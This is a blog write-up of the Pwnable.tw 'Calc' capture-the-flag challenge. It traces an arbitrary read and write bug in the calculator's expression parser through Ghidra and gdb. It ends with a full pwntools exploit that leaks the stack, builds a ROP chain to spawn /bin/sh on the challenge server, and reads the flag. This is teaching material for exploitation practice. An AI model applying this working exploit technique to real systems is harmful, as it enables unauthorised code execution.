---
layout: single_c
title:  "Pwnable.tw Level 3 - Calc"
date:   2019-08-16 1:01:16 +0530
categories: Pwnable.tw
tags: Binary-Exploitation
classes: wide
--- 
### [Pwnable.tw Level 3 - Calc](https://pwnable.tw/challenge/#3)  

## Challenge
```
Have you ever use Microsoft calculator?

nc chall.pwnable.tw 10100
```
## Static Analysis
lets check file properties
```bash
itpc@iTPC-LT31:~/Downloads$ file calc 
calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24,   
BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped

itpc@iTPC-LT31:~/Downloads$ ./checksec.sh --file calc 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   calc
```
So we have stack `canary` and the `stack` is not executable.

Lets take a look at the functions in the binary using ghidra.


Main function
```cpp
void main(void)

{
  signal(0xe,timeout);
  alarm(0x3c);
  puts(&UNK_080bf81c);
  fflush(stdout);
  calc();
  puts(&UNK_080bf842);
  return;
}

```
The main functions calls `calc` function and also `signal`.
`signal` starts a timer and terminates the program after a certain time interval.

Lets look at `calc` and other functions `calc` calls
```cpp

void calc(void)

{
  int iVar1;
  int in_GS_OFFSET;
  int local_5a4;
  undefined4 auStack1440 [100];
  undefined local_410 [1024];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  while( true ) {
    bzero(local_410,0x400);
    iVar1 = get_expr(local_410,0x400);
    if (iVar1 == 0) break;
    init_pool(&local_5a4);
    iVar1 = parse_expr(local_410,&local_5a4);
    if (iVar1 != 0) {
      printf("%d\n",auStack1440[local_5a4 + -1]);
      fflush((FILE *)stdout);
    }
  }
  if (local_10 == *(int *)(in_GS_OFFSET + 0x14)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
The function `calc` calls the following functions  
`bzero` : It zeros the memory region  
`get_expr`: It is used to read the expression and separates the symbols and numbers    
`parse_expr`: Evaluates the separated expression    
There are few checks in `parse_expr` to prevent incomplete expression and division by zero  

After looking around for quite sometime for some kind of vulnerabilities I was pretty disappointed and frustrated.
Even though I understood the overall code I was having a hard time understanding and following the variables and I couldn't figure out any kind of vulnerabilities that I could exploit.  
Then I tried to trigger some kind of `segfault` by entering different inputs.
## Dynamic Analysis

Lets try fuzzing with few inputs
```bash
root@kali:~/Downloads# ./calc
=== Welcome to SECPROG calculator ===
12121212-1121121
11000091
-123243434+1232312321
Segmentation fault
root@kali:~/Downloads# ./calc
=== Welcome to SECPROG calculator ===
+123456-1244
Segmentation fault
root@kali:~/Downloads# ./calc
=== Welcome to SECPROG calculator ===
+400+12345
-2306123
-12345-123
-123
1234/4
308
+1234/4
0
+1234-4
-4
+1234+255
251
a
Merry Christmas!
```
And finally we have a `segfault`. Ooh it feels so good.  

I noticed few things here
1. When we use a plus or minus sign before the first number it accepts the input and spits out some random number. (Or is it really random)
2. The program `segfaults` when you enter a large number with `+` or `-` sign before the first number.

Lets run `gdb` and investigate

```bash
gef➤  r
Starting program: /root/Downloads/calc
=== Welcome to SECPROG calculator ===
+1234567890-1

Program received signal SIGSEGV, Segmentation fault.
0x08049160 in parse_expr ()
[ Legend: Modified register | Code | Heap | Stack | String ]
-------------------------------------------------------------
snipped
-------------------------------------------------------------
    0x8049155 <parse_expr+299> mov    DWORD PTR [edx], ecx
    0x8049157 <parse_expr+301> mov    edx, DWORD PTR [ebp-0x90]
    0x804915d <parse_expr+307> mov    ecx, DWORD PTR [ebp-0x74]
 →  0x8049160 <parse_expr+310> mov    DWORD PTR [edx+eax*4+0x4], ecx
    0x8049164 <parse_expr+314> mov    edx, DWORD PTR [ebp-0x84]
    0x804916a <parse_expr+320> mov    eax, DWORD PTR [ebp-0x8c]
    0x8049170 <parse_expr+326> add    eax, edx
    0x8049172 <parse_expr+328> movzx  eax, BYTE PTR [eax]
    0x8049175 <parse_expr+331> test   al, al
─────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "calc", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049160 → parse_expr()
[#1] 0x80493f2 → calc()
[#2] 0x8049499 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
So the program `segfaults` at the following line
```
 0x8049160 <parse_expr+310> mov    DWORD PTR [edx+eax*4+0x4], ecx
 ```
 The program `segfaults` when the program is trying to write to `DWORD PTR [edx+eax*4+0x4]`.  
 Lets check the values of these registers
 ```bash
$eax   : 0x499602d2
$ebx   : 0x080481b0  →  <_init+0> push ebx
$ecx   : 0x1
$edx   : 0xffffd078  →  0x499602d3
$esp   : 0xffffcfb0  →  0x080f05e8  →  0x00000031 ("1"?)
$ebp   : 0xffffd058  →  0xffffd618  →  0xffffd638  →  0x08049c30  →  <__libc_csu_fini+0> push ebx
$esi   : 0x0
$edi   : 0x080ec00c  →  0x08069120  →  <__stpcpy_sse2+0> mov edx, DWORD PTR [esp+0x4]
$eip   : 0x08049160  →  <parse_expr+310> mov DWORD PTR [edx+eax*4+0x4], ecx
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────
```
``[edx+eax*4+0x4]`` points to an invalid address hence it segfaults. There is some other interesting things here  
`eax` contains the first value we entered and `ecx` contains the second the value we entered.
So we have the ability to write anything(using `ecx`) anywhere (using `eax`) we want.  
Awesome!   
Lets see how we can exploit that. But before that lets check the `printf` too since we were getting random output.  
Lets run the program again and set a break point at `printf`
```bash
   0x080493ff <+134>:   mov    eax,DWORD PTR [ebp+eax*4-0x59c]
   0x08049406 <+141>:   mov    DWORD PTR [esp+0x4],eax
   0x0804940a <+145>:   mov    DWORD PTR [esp],0x80bf804
=> 0x08049411 <+152>:   call   0x804ff60 <printf>
```
The program is printing whatever is at `[ebp+eax*4-0x59c]`.   
Lets check the value of `eax`
```bash
gef➤  break *0x08049411
gef➤  r
Starting program: /root/Downloads/calc
=== Welcome to SECPROG calculator ===
+255+15
Breakpoint 1, 0x08049411 in calc ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xf
$ebx   : 0x080481b0  →  <_init+0> push ebx
$ecx   : 0xf
$edx   : 0x7
$esp   : 0xffffd060  →  0x080bf804  →  0x000a6425 ("%d"?)
$ebp   : 0xffffd618  →  0xffffd638  →  0x08049c30  →  <__libc_csu_fini+0> push ebx
$esi   : 0x0
```
`eax` contains the value we have entered.
So we can read from anywhere in the memory and we can write to anywhere in memory.  
### Few Limitations
After playing around a bit I found the following  
1. We cannot write a value bigger than `0x7fffffff`. [I tried this by entering a very large number and `ecx` has the value we entered]  
2. The stack is not executable so we have to use `ROP`  
3. The stack value kept on shifting but we can use the `same` value of `eax` to overwrite and to read from `stack` where the return pointer of main is  
So my plan was to pop a shell using `ROP`. I used the `return` pointer of `main` function to start the `ROP` chain.
Before that I calculated the value of `eax` required to write to and read from the position of the return pointer of `main` function

I used the following script to calculate the required `eax` value
```python
from pwn import *
from ctypes import *

def signed(x):
    return c_int(x).value

def ov(y):
    ov = signed(y)
    edx = signed(0xff977038)  #I took a sample value of edx to calculate the offset to main ret address
    return (ov - 4 -edx)/4 # Finding value of eax required to overwrite the given address from "DWORD PTR [edx+eax*4+0x4], ecx"
main_ret=ov(0xff9775fc)  #Sample main return address used to calculate the offset
```
The function `ov` return the value of `eax` required to write the given address.
When `eax` was `+369` we could leak the return value of main and we can use the same offset to write to that address.
```bash
gef➤  disas main
----------
output snipped
----------
   0x08049499 <+71>:    mov    DWORD PTR [esp],0x80bf842
   0x080494a0 <+78>:    call   0x80504c0 <puts>
   0x080494a5 <+83>:    leave
   0x080494a6 <+84>:    ret
gef➤  break *0x080494a6
Breakpoint 1 at 0x80494a6

gef➤  r
Starting program: /root/Downloads/calc
=== Welcome to SECPROG calculator ===
+369
134518394
+370
1
a
Merry Christmas!

Breakpoint 1, 0x080494a6 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────── registers ────
Output Snipped
────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/20wx $esp
0xffffd63c:     0x0804967a      0x00000001      0xffffd6c4      0xffffd6cc
0xffffd64c:     0x00000000      0x00000000      0x080481b0      0x00000000
0xffffd65c:     0x080ec00c      0x08049c30      0xd0980304      0x2618f2eb
0xffffd66c:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd67c:     0x00000000      0x00000000      0x00000000      0x00000000
```
We can see we have successfully leaked the return address. [`134518394` is `0x0804967a` in decimal]. But we can't use this address to get the stack address but the value at 3rd offset(+371) from the return value points to the stack. So if leak this address we can understand the stack address.
### Why we have to leak the stack address
My first plan was to simply write a shellcode without depending on any leaked value. But I faced few problems. Actually we don't have to leak the stack address to put together the exploit since every time the offset `369` will point to the return address of `main` function. So we can simply write our `ROP` chain using the offsets as each offset plus one will point to the next address. But I faced the problem here. To pop a shell we have to point `ebx` to the address of string `/bin/bash`. So we have to write the string to somewhere in stack. But when we write the string to the stack the address of the string will be greater than `0x7fffffff`, which is the greatest value we can write. So we have to write the string to any address less than `0x7fffffff`. So my plan was to write to `.BSS`. Now we have another problem. `.BSS` is at a fixed location but the stack value keeps on changing so the offset or the address length between the `retun` value of `main` function and `.BSS` keeps on changing every time we run the program. But if we can leak the stack address then we will be able to calculate the value we have to enter in `eax` to overwrite the address of `.BSS`.
This is why we have to leak the stack address.

## Solution 

So my plan was to do the following
1. Find `ROP` gadgets set the value of `eax=0xb`, `ebx=address of /bin/bash`, `ecx=pointer to pointer of /bin/bash`, `edx=points to null`
2. Leak the value of stack to calculate the offset of `.BSS`
3. Overwrite `.BSS` with string and then write that address to stack

And I put together the following script
```python
from pwn import *
from ctypes import *

def signed(x): #Function to convert hex to decimal
    return c_int(x).value

def ov(y): #Converts the address to be written to offset value (eax)
    ov = signed(y)
    edx = signed(0xff977038)  #I took a sample value of edx to calculate the offset to main ret address
    return (ov - 4 -edx)/4 # Finding value of eax required to overwrite the given address from "DWORD PTR [edx+eax*4+0x4], ecx"

def ov_sh(y): # This function gives the value of eax required to overwrite the .BSS
    ov = signed(y)
    edx_n = edx()
    return (ov - 4 -edx_n)/4

def edx(): # Calculating edx used for calculating eax to overwrite .BSS using the leaked stack value
    ov=edx_sh
    edx=(ov-(403*4))
    return edx

def exploit():
    sh="/bin/sh\0x00" 
    sh2=u32(sh[4:8])
    sh1=u32(sh[0:4])
    
    main_ret=ov(0xff9775fc) #Sample main return address used to calculate the offset
    shaddr=0x080ec050 # .BSS address where we are going to write the string (ebx)
    pointer_to_sh=0x80ec060 # Pointer to the pointer of /bin/sh (ecx)
    pointer_to_null=0x080ec064 # Pointer to null (edx)
    
    pop_eax=0x0805c34b  #ROP gadget to pop eax
    pop_edx_ecx_ebx=0x080701d0 #ROP gadget
    int_80=0x08070880 #ROP gadget

    #writesh
    write(ov_sh(shaddr)+1,sh2)  #Writes the string /bin/sh
    write(ov_sh(shaddr),sh1)

    #write pointer_to_sh for ecx
    write(ov_sh(pointer_to_sh),signed(shaddr)) #write the address of /bin/sh to another address (ecx)

    #write stack
    print ("writing main stack")

    #write exit  #the stack is written in reverse starting with the last address
    exit=0x0804f010 #Exit to gracefully exit the program (not required)
    write(main_ret+7,signed(exit))

    #write int 0x80 
    write(main_ret+6,signed(int_80))

    #ebx=shaddr
    write(main_ret+5,signed(shaddr))

    #ecx=pointer_to_sh
    write(main_ret+4,signed(pointer_to_sh))

    #edx=0
    write (main_ret+3,signed(pointer_to_null))

    #pop_edx_ecx_ebx
    write(main_ret+2,signed(pop_edx_ecx_ebx))

    #eax=b
    write(main_ret+1,11)

    #pop_eax
    write(main_ret,signed(pop_eax))

def write(addr,value):
    send="+"+str(addr)+"+"+str(value)
    print send
    calc.sendline(send)
    
calc=remote('chall.pwnable.tw',10100)
calc.recvuntil("==\n")
calc.sendline("+371")  #Leaking the stack address to calculate the offset to .BSS
edx_sh=int(calc.recv()[:-1])

exploit()
calc.sendline("Popping Shell")
calc.interactive()
```
And lets run it 
```bash
root@kali:~/Downloads# python calc6.py
[+] Opening connection to chall.pwnable.tw on port 10100: Done
+34561102+6845231
+34561101+1852400175
+34561105+135184464
writing main stack
+375+134541328
+374+134678656
+373+135184464
+372+135184480
+371+135184484
+370+134676944
+369+11
+368+134595403
[*] Switching to interactive mode
6845231
1852400175
135184464
269054400
134678656
135184464
132126156
132126152
134676945
134518405
269115259
$ cat /home/calc/flag
FLAG{xxxxxxxxxxxxxxxx}
```
### Solved!

## After Thoughts
I found this level to be incredibly tough and the python script is not very elegant and can be a little confusing. I am sure that it can be written in a better way but I am still a noob. I have tried my best to explain what I did. I saw few other writeups where they have completed this level using much better shellcodes. I used a very basic shellcode for popping a shell. You could use a much shorter and better shellcode instead. So I advice you to go checkout other writeups also.